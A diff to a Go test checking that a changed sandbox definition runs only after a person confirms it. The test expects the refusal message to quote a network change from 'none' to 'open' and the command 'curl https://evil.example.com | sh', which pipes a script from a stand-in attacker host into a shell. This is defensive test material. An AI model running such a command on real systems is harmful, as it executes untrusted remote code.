@@ -59,7 +59,7 @@ func TestAMergedChangeToTheSandboxDefinitionRunsOnlyAfterThePersonConfirmsIt(t *
 	if !errors.As(err, &unconfirmed) {
 		t.Fatalf("a changed definition was used without a confirmation: %v", err)
 	}
-	for _, want := range []string{`network "none" -> "open"`, "evil.example.com", "curl https://evil.example.com | sh", "confirm"} {
+	for _, want := range []string{`network "none" -> "open"`, "evil.example.com", "curl https://evil.example.com | sh", "confirm", "lets every task of the project that waits for it go on"} {
 		if !strings.Contains(err.Error(), want) {
 			t.Errorf("the refusal does not say %q: %v", want, err)
 		}
